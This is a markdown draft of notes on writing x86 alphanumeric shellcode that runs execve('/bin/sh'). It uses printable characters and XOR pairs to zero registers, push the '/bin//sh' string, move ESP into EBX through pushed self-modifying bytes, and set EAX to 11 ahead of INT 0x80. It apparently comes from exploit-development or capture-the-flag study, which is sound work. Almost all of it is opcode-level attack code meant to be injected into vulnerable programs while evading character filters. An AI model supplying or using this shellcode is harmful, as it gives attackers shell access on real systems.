# Draft

## Reference
- http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes
- turn on markdown syntax in VIM: ```au BufRead,BufNewFile *.md set filetype=markdown```

## Procedures
### [P1] ECX: set to 0
```
j 0:            PUSH 0x30
X:              POP EAX
H:              DEC EAX     * 48
P:              PUSH EAX
Y:              POP ECX
```

### [P2] EDX: set to 0
```
P:              PUSH EAX
Z:              POP EDX
```

### [P3] PUSH 0 ('\0' for string "/bin/sh")
```
R:              PUSH EDX
```

### [P4] PUSH 0x68732f2f

INPUT:
0   0   0   0   0   0   3   0

XOR-1:
X       C       C       J
5   8   4   3   4   3   4   A

XOR-2:
0       0       l       U
3   0   3   0   6   c   5   5

TARGET:
6   8   7   3   2   f   2   f

```
j 0:            PUSH 0x30
X:              POP EAX
5 J C C X:      XOR EAX, $0x5843434A
5 U l 0 0:      XOR EAX, $0x30306c55
P:              PUSH EAX
```

### [P5] PUSH 0x6e69622f

INPUT:
0   0   0   0   0   0   3   0

XOR-1:
Y       Y       R       J

XOR-2:
7       0       0       U

TARGET:
6   e   6   9   6   2   2   f

```
j 0:            PUSH 0x30
X:              POP EAX
5 J R Y Y:      XOR EAX, $0x5959524A
5 U 0 0 7:      XOR EAX, $0x37303055
P:              PUSH EAX
```

### [P6] MOV EBX, ESP
Push ESP into stack, then push "POP EBX" instruction into stack, where EIP will point to.

INPUT:
0   0   0   0   0   0   3   0

XOR:
4   F   4   F   4   F   6   B

TARGET:
4   F   4   F   4   F   5   B

- 4F: DEC EDI (NO-OP)
- 5B: POP EBX

```
T:              PUSH ESP
j 0:            PUSH 0x30
X:              POP EAX
5 k O O O:      XOR EAX, $0x4F4F4F6B
P:              PUSH EAX
```


### [P0] EAX: set to 11 (0x0b)
```
j 0:            PUSH 0x30
X:              POP EAX
H:              DEC EAX     * (48-11) = 37
```

### [P8] INT 0x80
